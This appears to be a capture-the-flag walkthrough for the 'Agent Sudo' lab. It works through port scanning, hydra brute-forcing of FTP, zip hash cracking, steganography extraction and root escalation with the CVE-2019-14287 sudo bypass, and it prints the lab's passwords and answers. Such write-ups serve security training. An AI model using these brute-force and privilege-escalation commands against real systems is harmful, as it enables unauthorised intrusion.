# Agent Sudo

## :map: Enumerate

### How many open ports?

```
nmap 10.10.219.222
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-52-03.png>)

### How you redirect yourself to a secret page?

> user-agent

### What is the agent name?

```
echo {A..Z} | tr ' ' '\n' > agent.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-57-22.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-57-53.png>)

## :hash: Hash Cracking and Brute-Force

### FTP password

```
hydra -l chris -P /usr/share/metasploit-framework/data/wordlists/password.lst \
      ftp://10.10.219.222 -I -f -V -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 17-35-15.png>)

### Zip file password

```
lftp 10.10.219.222 -u chris,crystal
lftp :~> ls -a
lftp :~> cat To_agentJ.txt
lftp :~> get cute-alien.jpg
lftp :~> get cutie.png
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 17-36-57.png>)

```
binwalk cutie.png
binwalk -D '.*' cutie.png
zip2john _cutie.png.extracted/8702 > zip.txt
hashcat -a 0 -m 13600 zip.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 18-06-40.png>)

### steg password

```
7z x _cutie.png.extracted/8702
cat To_agentR.txt
echo -n 'QXJlYTUx' | base64 -d
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 18-09-26.png>)

### Who is the other agent?

```
steghide extract -sf cute-alien.jpg
cat message.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 18-14-30.png>)

### SSH password

> hackerrules!

## :triangular\_flag\_on\_post: Capture the user flag

### What is the user flag?

```
ssh james@10.10.219.222
$ ls -lA
$ cat user_flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 18-29-31.png>)

### What is the incident of the photo called?

```
scp james@10.10.219.222:/home/james/Alien_autospy.jpg .
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 18-35-05.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-28 18-35-10.png>)

### :top: Privilege escalation

### CVE number for the escalation

> CVE-2019-14287

### What is the root flag?

```
$ sudo -l
$ sudo -u#-1 /bin/bash
# cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 18-39-34.png>)

### Who is Agent R?

> DesKel

## :link: Support Material

{% embed url="https://programmer.ink/think/cve-2019-14287-linux-sudo-vulnerability-analysis.html" %}
